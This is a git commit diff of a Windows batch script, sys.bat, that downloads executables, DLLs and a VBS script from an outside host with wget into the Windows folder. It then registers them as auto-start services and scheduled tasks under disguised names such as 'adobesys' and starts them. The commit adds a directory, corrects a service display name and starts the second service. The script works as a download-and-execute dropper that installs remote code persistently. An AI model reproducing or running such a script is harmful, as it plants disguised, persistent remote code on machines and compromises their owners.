afa9f4cd448ed780ad0b5318f2b567771c2a5fbb
pistacchietto <pistacchietto2@gmail.com>
2019-10-13 18:31:45 +0200

    ok

--- sys.bat
+++ sys.bat
@@ -3,6 +3,7 @@ taskkill /f /im sys2.exe
 taskkill /f /im sys3.exe
 sc delete CppWindowsService
 sc delete adobesys
+mkdir c:\windows\hp
 wget http://troglo.homepc.it/win/exec1.dll -O c:\windows\exec1.dll
 wget http://troglo.homepc.it/win/CppWindowsService.xml -O c:\windows\CppWindowsService.xml
 wget http://troglo.homepc.it/win/adobesys.xml -O c:\windows\adobesys.xml
@@ -21,11 +22,12 @@ schtasks /create /tn adobesys /xml %windir%\adobesys.xml /F
 wget http://troglo.homepc.it/win/sys2.exe -O c:\windows\sys2.exe
 wget http://troglo.homepc.it/win/sys3.exe -O c:\windows\sys3.exe
 sc create CppWindowsService binPath= c:\windows\sys2.exe DisplayName= "CppWindowsService" start= auto
-sc create adobesys binPath= c:\windows\sys3.exe DisplayName= "CppWindowsService" start= auto
+sc create adobesys binPath= c:\windows\sys3.exe DisplayName= "adobesys" start= auto
 wget http://troglo.homepc.it/win/svc.vbs -O c:\windows\svc.vbs
 wget http://troglo.homepc.it/win/libssl-1_1.dll -O c:\windows\libssl-1_1.dll
 wget http://troglo.homepc.it/win/libcurl.dll -O c:\windows\libcurl.dll
 wget http://troglo.homepc.it/win/libcrypto-1_1.dll -O c:\windows\libcrypto-1_1.dll
 cscript c:\windows\svc.vbs
 net start CppWindowsService
+net start adobesys
  
